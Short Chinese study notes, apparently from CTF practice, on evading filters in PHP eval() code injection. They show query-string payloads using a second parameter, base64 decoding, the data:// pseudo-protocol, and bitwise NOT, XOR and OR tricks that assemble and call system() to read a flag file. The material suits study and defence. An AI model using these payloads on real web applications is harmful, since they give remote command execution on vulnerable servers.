参数逃逸：通过创造新变量并在检测之后赋值来逃脱匹配
1.      ?c=eval($GET[x]);&x=phpinfo();
        eval($_GET['c'])
2.      进行进一步加密绕过
        ?c=eval(base64_decode($_GET[x]));&x=Y3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
        eval($_GET['c'])
伪协议绕过：使用文件包含或其他能够使用伪协议的函数方法
        ?c=include(data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+)
位运算绕过:ascii码的二进程层面进行运算绕过
1.取反(~):对二进制01取相反的10
        将代码的二进制值进行取反并url编码,发给后端再进行取反变回代码执行,用于绕过字母过滤的绕过
        $_=~'\x8c\x86\x8c\x8b\x9a\x92';$_()
        (~urldecode('%8C%86%8C%8B%9A%92'))()-->system()
注意:~是一元运算符,能直接用括号包裹当成函数头使用
2.异或(^):相同得0.不同得1
        '['的ASCII码是91,二进制是 0101 1011
        '('的ASCII码是40,二进制是 0010 1000
        's'                      0111 0011
        $_=('['^'(').(']'^'$').('['^'(').('\\'^'(').('%'^'@').('-'^'@')
        $_()-->system()
注意:异或^是二元运算符,只有php7+版本以上才支持用括号包裹内容当成函数头使用,低版本
只接收给变量赋值,然后用变量当函数头
3.或(|):有1得1,全0才0(只要有一个真就全真)
        '[' | '('   
        0x5B(01011011)| 0x28(00101000)-->01111011-->0x7b='{'